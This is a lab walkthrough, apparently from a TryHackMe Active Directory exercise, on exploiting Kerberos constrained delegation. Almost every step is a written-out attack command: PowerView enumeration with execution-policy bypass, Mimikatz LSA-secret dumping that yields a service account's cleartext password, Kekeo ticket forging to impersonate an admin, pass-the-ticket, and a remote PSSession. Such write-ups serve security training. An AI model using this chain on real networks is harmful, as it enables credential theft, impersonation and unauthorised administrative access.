---
title: Exploiting Constrained Delegation
updated: 2023-04-25T14:01:30.0000000+04:00
created: 2023-04-24T17:05:58.0000000+04:00
---

Exploiting Constrained Delegation
Monday, April 24, 2023
5:05 PM
## Step 1: The first thing we need to do is enumerate available delegations. 

Let's use our new privileged user for the network couple of commands.

- Use the Tier 2 Admin Account that you got.

We can use the Get-NetUser cmdlet of PowerSploit for this enumeration by running the following command:

### Load PowerShell

| Command | Powershell -ep bypass |
|---------|-----------------------|
### Using Powerview
| Command | PS C:\\\> Import-Module C:\Tools\PowerView.ps1 |
|---------|------------------------------------------------|
| Command | PS C:\\\> Get-NetUser -TrustedToAuth           |

Based on the output of this command, we can see that the

### svcIIS account can delegate the HTTP and WSMAN services on THMSERVER1. 

![image1](image1-123.png)

You would think that this means we can only access websites on behalf of impersonated users. However, PowerShell Remoting uses the HTTP and WSMAN services as well. The ideal option would be to impersonate a Tier 1 Admin since this would provide us with administrative access over THMSERVER1.

If you were to perform proper post-exploitation enumeration of THMWRK1, you would find that there is a service on the host running as the svcIIS user. Since we have administrative access now, we can use this to dump LSASecrets, part of the Windows Registry Hive where credentials are stored for features such as Windows services. Let's use Mimikatz to dump the secrets:

## Step 2: Dump Secrets with Mimikatz

![image2](image2-61.png)

### Commands:

| Command | C:/Tools/Mimikatz.exe |
|---------|-----------------------|
| Command | Token::elevate        |
| Command | Lsadump::secrets      |

### Explaining Command used:

- token::elevate - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user.

- lsadump::secrets - Mimikatz interacts with the registry hive to pull the clear text credentials.

### Secrets Found:

- Username: svcIIS@za.tryhackme.loc
- Password: Password1@

## Step 3: Performing Kerberos Delegation

1.  Use Kekeo and Mimikatz
2.  Exit Mimikatz after token::elevate
3.  Use Kekeo to generate tickets
4.  Use mimikatz to load tickets into memory

## Step 4: We first need to generate a TGT that can be used to generate tickets for the HTTP and WSMAN services

- Navigate to the user directory Desktop to run these command:

![image3](image3-43.png)

- Now you can run the commands

### \## Launching mimikatz:

| Command | C:/Tools/mimikatz.exe |
|---------|-----------------------|

![image4](image4-30.png)

### \## Launching Kekeo

![image5](image5-20.png)

| Command | tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@ |
|---------|---------------------------------------------------------------------|

![image6](image6-13.png)

### Parameters Explained:

1.  user - The user who has the constrained delegation permissions.
2.  domain - The domain that we are attacking since Kekeo can be used to forge tickets to abuse cross-forest trust.
3.  password - The password associated with the svcIIS account.

## Step 5: Now that we have the TGT for the account that can perform delegation, we can forge TGS requests for the account we want to impersonate. We need to perform this for both HTTP and WSMAN to allow us to create a PSSession on THMSERVER1

| Command | tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt\~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc |
|---------|-----------------------------------------------------------------------------------------------------------------------------------------------------------|

![image7](image7-10.png)

###  Parameters explained:

1.  tgt - We provide the TGT that we generated in the previous step.
2.  user - The user we want to impersonate. Since t2\_ accounts have administrative access over workstations, it is a safe assumption that t1\_ accounts will have administrative access over servers, so choose a t1\_ account that you would like to impersonate.
3.  service - The services we want to impersonate using delegation. We first generate a TGS for the HTTP service. Then we can rerun the same command for the WSMAN service.

## Step 6: Perform the same for the WSMAN Service

| Command | tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt\~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:WSMAN/THMSERVER1.za.tryhackme.loc |
|---------|------------------------------------------------------------------------------------------------------------------------------------------------------------|

![image8](image8-9.png)

## Step 7: Using Mimikatz to Import Them

![image9](image9-6.png)

![image10](image10-3.png)

| Command | Privilege::debug                                                                                             |
|---------|--------------------------------------------------------------------------------------------------------------|
| Command | kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman\~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi |
| Command | kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http\~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi  |

## Step 8: You can exit Mimikatz and run klist if you want to verify that the tickets were imported. 

![image11](image11-2.png)

## Step 9: Now that the tickets are imported, we can finally create our PSSession on THMSERVER1:

| Command 1 | New-PSSession -ComputerName thmserver1.za.tryhackme.loc   |
|-----------|-----------------------------------------------------------|
| Command 2 | Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc |

![image12](image12-2.png)

